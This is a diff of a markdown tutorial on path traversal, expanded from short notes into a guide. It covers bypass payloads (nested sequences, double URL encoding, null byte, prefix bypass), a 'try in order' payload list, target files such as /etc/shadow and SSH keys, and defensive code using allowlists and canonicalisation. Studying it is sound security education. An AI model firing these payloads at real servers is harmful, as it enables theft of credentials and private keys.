@@ -1,182 +1,303 @@
 # Path Traversal
 
-Path Traversal (also known as **Directory Traversal**) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.
+## Table of Contents
 
-It occurs when an application uses user-supplied input to construct file paths without properly validating or sanitizing the input.
-
-Successful exploitation can allow attackers to access sensitive files on the server.
-
-Possible impacts include:
-
-- Reading arbitrary files on the server
-- Accessing application source code and data
-- Retrieving credentials for back-end systems
-- Accessing sensitive operating system files
-- In some cases, writing arbitrary files on the server
-
----
-
-## Detection
-
-Path Traversal vulnerabilities typically occur when applications allow user input to specify file paths.
-
-Indicators include:
-
-- Parameters that reference files (`filename`, `file`, `path`, `template`, `page`)
-
-• File download functionality
-
-• Image or document loading endpoints
-
-• File preview functionality
-
-Common test payload:
-
-```
-../../../etc/passwd
-```
-
-If the response returns contents of system files, the application is vulnerable.
+1. [What Is Path Traversal?](#1-what-is-path-traversal)
+2. [Core Concept: How the Attack Works](#2-core-concept-how-the-attack-works)
+3. [Common Bypass Techniques](#3-common-bypass-techniques)
+   - 3.1 [Simple Traversal (No Defenses)](#31-simple-traversal-no-defenses)
+   - 3.2 [Absolute Path Bypass](#32-absolute-path-bypass)
+   - 3.3 [Nested Traversal Sequences](#33-nested-traversal-sequences)
+   - 3.4 [URL Encoding Bypass](#34-url-encoding-bypass)
+   - 3.5 [Required Start-of-Path Bypass](#35-required-start-of-path-bypass)
+   - 3.6 [Null Byte Extension Bypass](#36-null-byte-extension-bypass)
+4. [Defense & Prevention](#4-defense--prevention)
+5. [Quick Reference Cheat Sheet](#5-quick-reference-cheat-sheet)
 
 ---
 
-## Reading Arbitrary Files via Path Traversal
+## 1. What Is Path Traversal?
 
-Example application loading an image using a filename parameter.
+Path traversal (also called **directory traversal**) is a vulnerability that allows an attacker to **read — and sometimes write — arbitrary files** on the server running an application by manipulating file path inputs.
 
-HTML request:
+Files that may be exposed include:
 
-```
-<img src="/loadImage?filename=218.png">
-```
+- Application source code and data
+- Back-end credentials and config files
+- Sensitive OS files (e.g. `/etc/passwd`, `windows\win.ini`)
 
-The `loadImage` endpoint takes a `filename` parameter.
+In the worst case, write access leads to full server compromise.
 
-File is stored on disk at:
+### Simple Analogy
 
-```
-/var/www/images/218.png
-```
+Imagine a librarian who fetches any book you name from shelf `/var/www/books/`. You ask for `../../../secret_vault/passwords`. The librarian blindly walks three floors up from the shelf and returns the passwords file — because you used the stairs (`../`) they didn't know to block.
 
-If the application does not validate the input properly, an attacker can modify the parameter.
+### Relationship to Input Validation Flaws
 
-Malicious request:
-
-```
-https://insecure-website.com/loadImage?filename=../../../etc/passwd
-```
-
-This causes the application to read from:
-
-```
-/var/www/images/../../../etc/passwd
-```
-
-Traversal sequence:
-
-```
-../
-```
-
-This sequence moves **one directory up** in the file system.
+Path traversal is a **subtype of improper input validation**. The application trusts user-supplied filenames and passes them directly to filesystem APIs without verifying that the resolved path stays within the intended directory.
 
 ---
 
-## Path Traversal with Absolute Path Bypass
+## 2. Core Concept: How the Attack Works
 
-Some applications block traversal sequences such as `../`.
+### The Vulnerable Pattern
 
-An attacker may bypass this restriction by providing an **absolute file path** directly.
+A typical vulnerable application builds a file path by concatenating a fixed base directory with user input:
 
-Example payload:
+```
+Base directory:  /var/www/images/
+User input:      218.png
+Resolved path:   /var/www/images/218.png   intended
+```
 
+Because the application never validates that the resolved path stays inside the base directory, an attacker can supply traversal sequences instead:
+
+```
+User input:      ../../../etc/passwd
+Resolved path:   /var/www/images/../../../etc/passwd
+                 → /etc/passwd                         unintended
+```
+
+### The `../` Sequence
+
+`../` is a standard filesystem directive meaning **"go up one directory level"**. It is valid on all operating systems:
+
+| OS | Valid sequences |
+|----|-----------------|
+| Unix/Linux | `../` |
+| Windows | `..\` and `../` |
+
+Three consecutive `../` steps from `/var/www/images/` reach the filesystem root `/`, after which any path can be specified.
+
+### What the Server Reads
+
+```
+Request:
+GET /loadImage?filename=../../../etc/passwd
+
+Server resolves:
+/var/www/images/../../../etc/passwd  →  /etc/passwd
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+---
+
+## 3. Common Bypass Techniques
+
+Applications often implement defenses against path traversal. Here are the standard bypass methods for each type.
+
+---
+
+### 3.1 Simple Traversal (No Defenses)
+
+**Situation:** The application performs no sanitization whatsoever.
+
+**Payload:**
+```
+../../../etc/passwd          (Unix)
+..\..\..\windows\win.ini     (Windows)
+```
+
+**Why it works:** The `../` sequences are passed directly to the filesystem API, which resolves them normally.
+
+---
+
+### 3.2 Absolute Path Bypass
+
+**Situation:** The application strips or blocks `../` sequences, but does not validate whether the input is an absolute path.
+
+**Payload:**
 ```
 /etc/passwd
 ```
 
-If the application accepts absolute paths, it may return the contents of the file.
+**Why it works:** Supplying an absolute path skips traversal entirely. The filesystem API resolves it directly from root, ignoring any base directory the application intended.
 
 ---
 
-## Path Traversal with Non-Recursive Traversal Sequence Removal
+### 3.3 Nested Traversal Sequences
 
-Some applications attempt to remove traversal sequences such as `../`.
+**Situation:** The application strips `../` in a single non-recursive pass (strips the sequence once and uses whatever remains).
 
-However, if the removal is **non-recursive**, attackers can bypass the filter using repeated patterns.
-
-Example payload:
-
+**Payload:**
 ```
 ....//....//....//etc/passwd
 ```
 
-or
-
+**How it's constructed:**
 ```
-....\/....\/etc/passwd
+Original:   ....//
+Strip ../   → ../        ← inner sequence revealed after outer is stripped
+Result:     ../../../etc/passwd after three rounds
 ```
 
-After normalization, these patterns resolve to valid traversal sequences.
+**Why it works:** After stripping the inner `../` from `....//`, the remaining characters form a new `../` sequence. A single-pass strip never loops back to check again.
+
+**Variations:**
+```
+....\/....\/....\/etc/passwd
+```
 
 ---
 
-## Path Traversal with Superfluous URL Decoding
+### 3.4 URL Encoding Bypass
 
-Some applications perform **URL decoding multiple times**.
+**Situation:** The web server or application strips traversal sequences from URL-decoded input before passing it to the filesystem API.
 
-Attackers can use **double encoding** to bypass filters.
+**Payloads (in order of increasing encoding depth):**
 
-Example payload:
+| Encoding | Payload |
+|----------|---------|
+| URL encoded | `%2e%2e%2f` → `../` |
+| Double URL encoded | `%252e%252e%252f` → `../` |
+| Non-standard encodings | `..%c0%af` or `..%ef%bc%8f` |
 
+**Full example:**
 ```
-..%252f..%252f..%252fetc/passwd
-```
-
-Encoding examples:
-
-```
-../ → %2e%2e%2f
-../ → %252e%252e%252f
+filename=..%252f..%252f..%252fetc/passwd
 ```
 
-If the application decodes the input twice, the traversal sequence becomes valid.
+**Why it works:** The server decodes `%25` → `%`, producing `%2e%2e%2f`. The application then decodes again: `%2e%2e%2f` → `../`. The first-pass sanitization never saw a `../` to strip.
 
 ---
 
-## Path Traversal with Validation of Start of Path
+### 3.5 Required Start-of-Path Bypass
 
-Some applications enforce that the file path must start with a specific directory.
+**Situation:** The application validates that the filename **starts with** an expected base path (e.g. `/var/www/images`), but doesn't validate the final resolved path.
 
-Attackers can bypass this by starting with the allowed path and then traversing outside it.
-
-Example payload:
-
+**Payload:**
 ```
 /var/www/images/../../../etc/passwd
 ```
 
-Even though the path begins with the allowed directory, the traversal sequence allows access to sensitive files.
+**Why it works:** The input passes the prefix check because it starts with `/var/www/images`. After the check, the filesystem API resolves the full path, and the `../` sequences walk out of the base directory.
 
 ---
 
-## Path Traversal with File Extension Validation
+### 3.6 Null Byte Extension Bypass
 
-Some applications validate file extensions such as `.png` or `.jpg`.
+**Situation:** The application validates that the filename **ends with** an expected file extension (e.g. `.png`), appending it if missing or rejecting input that doesn't match.
 
-Attackers may bypass this validation using **null byte injection**.
-
-Example payload:
-
+**Payload:**
 ```
 ../../../etc/passwd%00.png
 ```
 
-The **null byte (`%00`)** terminates the string during backend processing.
+**Why it works:** `%00` is a null byte — a string terminator in many languages (C, PHP, older Java). The application's extension check sees `.png` at the end and passes. The filesystem API (written in a lower-level language) stops reading the string at `%00`, so the `.png` is silently dropped and `/etc/passwd` is opened.
 
-As a result, the application may treat the filename as:
+> **Note:** Null byte injection is less effective on modern runtimes (Python, Java 8+, .NET) that handle strings differently, but still appears in legacy codebases.
+
+---
+
+## 4. Defense & Prevention
+
+### Core Principle: Don't Pass User Input to Filesystem APIs
+
+The most effective fix is to **avoid letting user input touch filesystem APIs altogether**. Many features that load files can be redesigned to use internal IDs or whitelisted mappings instead.
+
+```python
+# Vulnerable
+filename = request.params['filename']
+open(BASE_DIR + filename)
+
+# Safe alternative — map IDs to filenames server-side
+FILE_MAP = {'1': 'product1.png', '2': 'product2.png'}
+filename = FILE_MAP.get(request.params['id'])
+if filename:
+    open(BASE_DIR + filename)
+```
+
+### Strategy 1: Whitelist Permitted Values
+
+If the set of valid filenames is known, compare user input against an explicit whitelist before any filesystem operation:
+
+```python
+ALLOWED = {'218.png', '219.png', '220.png'}
+if filename not in ALLOWED:
+    raise Exception("Invalid filename")
+```
+
+### Strategy 2: Canonicalize and Verify the Final Path
+
+If arbitrary filenames must be accepted, resolve the full path after appending user input and verify it still starts with the intended base directory:
+
+```java
+File file = new File(BASE_DIRECTORY, userInput);
+if (!file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
+    throw new SecurityException("Path traversal attempt blocked");
+}
+```
+
+**Why canonicalization matters:** `getCanonicalPath()` (Java) and `os.path.realpath()` (Python) resolve all `../`, symlinks, and encoding tricks — giving the true final path regardless of how input was obfuscated.
+
+### Strategy 3: Strict Input Validation
+
+If canonicalization isn't available, enforce strict character allowlists on the input itself — reject anything that isn't alphanumeric or an expected extension:
+
+```python
+import re
+if not re.match(r'^[a-zA-Z0-9_\-]+\.(png|jpg|gif)$', filename):
+    raise ValueError("Invalid filename")
+```
+
+### Strategy 4: Two Layers of Defense
+
+Use both strategies together. Input validation catches obvious attacks early; canonical path verification is the safety net for bypasses:
 
 ```
-../../../etc/passwd
+User input → Validate characters/format → Append to base dir → Canonicalize → Verify prefix → Open file
 ```
 
-while the extension check still sees `.png`.
+---
+
+## 5. Quick Reference Cheat Sheet
+
+### Signs an Endpoint May Be Vulnerable
+
+- Takes a `filename`, `path`, `file`, `doc`, `page`, or `include` parameter
+- Serves files from disk (images, PDFs, templates, configs)
+- Returns different errors for "file not found" vs "permission denied" (oracle)
+- Error messages reveal filesystem paths or OS details
+
+### Payload Progression (Try in Order)
+
+```
+1. ../../../etc/passwd                        simple traversal
+2. /etc/passwd                                absolute path bypass
+3. ....//....//....//etc/passwd               nested sequences
+4. ..%2f..%2f..%2fetc/passwd                  URL encoded
+5. ..%252f..%252f..%252fetc/passwd            double URL encoded
+6. ..%c0%af..%c0%af..%c0%afetc/passwd        non-standard encoding
+7. /var/www/images/../../../etc/passwd        prefix bypass
+8. ../../../etc/passwd%00.png                 null byte bypass
+```
+
+### Target Files Worth Reading
+
+| OS | File | Contents |
+|----|------|----------|
+| Linux/Unix | `/etc/passwd` | User accounts |
+| Linux/Unix | `/etc/shadow` | Password hashes (if readable) |
+| Linux/Unix | `/etc/hosts` | Host mappings |
+| Linux/Unix | `/proc/self/environ` | Environment variables (may hold secrets) |
+| Linux/Unix | `~/.ssh/id_rsa` | SSH private key |
+| Windows | `\windows\win.ini` | System configuration |
+| Windows | `\windows\system32\drivers\etc\hosts` | Host mappings |
+| Any | App config files | DB credentials, API keys, secrets |
+
+### Common Bypass Summary
+
+| Defense Applied | Bypass Technique | Example Payload |
+|----------------|-----------------|-----------------|
+| None | Simple traversal | `../../../etc/passwd` |
+| Strips `../` | Absolute path | `/etc/passwd` |
+| Strips `../` (non-recursive) | Nested sequences | `....//....//....//etc/passwd` |
+| Decodes then strips | URL / double encoding | `..%252f..%252f..%252fetc/passwd` |
+| Checks path prefix | Prefix + traversal | `/var/www/images/../../../etc/passwd` |
+| Checks file extension | Null byte | `../../../etc/passwd%00.png` |
+
+---
